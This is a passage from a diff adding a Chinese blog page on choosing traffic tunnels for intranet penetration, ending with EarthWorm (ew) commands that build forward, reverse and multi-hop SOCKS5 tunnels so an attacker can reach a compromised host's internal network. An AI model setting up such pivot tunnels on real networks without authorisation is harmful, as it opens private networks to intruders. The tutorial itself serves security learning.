+</tr>
+<tr>
+<td align="center">二级网络（被控中间端有公网IP）</td>
+<td align="center">攻击端直接访问；中间端：lcx_tran；目标端：ssocksd</td>
+</tr>
+<tr>
+<td align="center">二级网络（被控中间端无公网IP）</td>
+<td align="center">攻击端：lcx_listen；中间端：lcx_slave；目标端：ssocksd</td>
+</tr>
+</tbody></table>
+<ul>
+<li>正向SOCKS5</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标端，目标端必须有一个公网IP</span></span><br><span class="line">ew -s ssocksd -l <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">因为知道目标端IP，所以使用SocksCap64、Proxifier等代理工具进行连接</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反向SOCKS5</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标机器没有公网IP</span></span><br><span class="line"><span class="comment">//攻击端，在攻击端建立一个SOCKS隧道，并且将1008端口收到的信息（攻击端发出的信息），转发的888端口</span></span><br><span class="line">ew -s rcsocks -l <span class="number">1008</span> -e <span class="number">888</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//目标端，在目标端也建立一个SOCKS隧道，然后反弹到提供的IP的端口上，至此隧道搭建成功</span></span><br><span class="line">ew -s rssocks -d <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> -e <span class="number">888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个时候我们访问攻击端的1008端口，即可享受目标端的网络环境了</span></span><br></pre></td></tr></table></figure>
+
+<p>而如果是二级网络环境，像如下两种情况：</p>
+<ul>
+<li>二级网络，情况一：</li>
+</ul>
+<p><img src="/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Ca.jpg"></p>
+<p>被控中间端有公网IP，直接做一个端口转发，攻击端就可以直接访问了<br>需要使用lcx_tran功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标端（B主机）启动SOCKS隧道</span></span><br><span class="line">ew -s ssocksd -l <span class="number">888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不能算是攻击端（A主机），启动SOCKS隧道并将1080端口收到的数据转发到888端口中</span></span><br><span class="line">ew -s lcx_tran -l <span class="number">1080</span> -f <span class="number">10.48</span><span class="number">.128</span><span class="number">.25</span> -g <span class="number">888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//10.48.128.25是A主机的公网IP，我们只要访问这个IP的1080端口，即可访问B主机的内网环境</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>二级网络，情况二：</li>
+</ul>
+<p><img src="/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Cb.jpg"></p>
+<p>被控中间端没公网IP，只能主动访问外部攻击端<br>需要使用lcx_listen与lcx_slave功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端，建立SOCKS隧道，并将1080端口数据转发至888</span></span><br><span class="line">ew -s lcx_listen -l <span class="number">1080</span> -e <span class="number">888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标端（B主机），启用SOCKS隧道</span></span><br><span class="line">ew -s ssocksd -l <span class="number">999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//中间端（A主机），牵线搭桥作用，将攻击端的888与目标端的999连接起来，至此SOCKS5隧道搭建成功</span></span><br><span class="line">ew -s lcx_slave -d <span class="number">139.</span>*.*<span class="number">.113</span> -e <span class="number">888</span> -f <span class="number">10.48</span><span class="number">.128</span><span class="number">.49</span> -g <span class="number">999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//访问攻击端的1080，即可享受B主机的内网环境</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>三级网络需要使用lcx_listen、lcx_slave与反向连接的rcsocks、rssocks相结合，在此不详解。</li>
+</ul>
+</div><div class="article-licensing box"><div class="licensing-title"><p>内网穿透中流量隧道的选择问题</p><p><a href="http://example.com/2020/08/28/内网穿透中流量隧道的选择问题/">http://example.com/2020/08/28/内网穿透中流量隧道的选择问题/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-08-28</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2021-03-10</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/23/AllTheThings/"><span class="level-item">精确翻译黑客范歌曲AllTheThings</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="Resek4"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Resek4</p><p class="is-size-6 is-block">对创意上下求索</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>NightCity</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Resek4" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Resek4"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/Resek_4"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#判断内网连通性"><span class="level-left"><span class="level-item">1</span><span class="level-item">判断内网连通性</span></span></a></li><li><a class="level is-mobile" href="#网络隧道的选择"><span class="level-left"><span class="level-item">2</span><span class="level-item">网络隧道的选择</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#网络层"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">网络层</span></span></a></li><li><a class="level is-mobile" href="#传输层"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">传输层</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#lcx端口转发与映射"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">lcx端口转发与映射</span></span></a></li><li><a class="level is-mobile" href="#nc"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">nc</span></span></a></li><li><a class="level is-mobile" href="#其他shell获取途径"><span class="level-left"><span class="level-item">2.2.3</span><span class="level-item">其他shell获取途径</span></span></a></li><li><a class="level is-mobile" href="#powercat"><span class="level-left"><span class="level-item">2.2.4</span><span class="level-item">powercat</span></span></a></li></ul></li><li><a class="level is-mobile" href="#应用层"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">应用层</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ssh协议"><span class="level-left"><span class="level-item">2.3.1</span><span class="level-item">ssh协议</span></span></a></li><li><a class="level is-mobile" href="#HTTP协议"><span class="level-left"><span class="level-item">2.3.2</span><span class="level-item">HTTP协议</span></span></a></li><li><a class="level is-mobile" href="#DNS"><span class="level-left"><span class="level-item">2.3.3</span><span class="level-item">DNS</span></span></a></li><li><a class="level is-mobile" href="#SOCKS代理"><span class="level-left"><span class="level-item">2.3.4</span><span class="level-item">SOCKS代理</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/HackStyle/"><span class="level-start"><span class="level-item">HackStyle</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Penetration/"><span class="level-start"><span class="level-item">Penetration</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
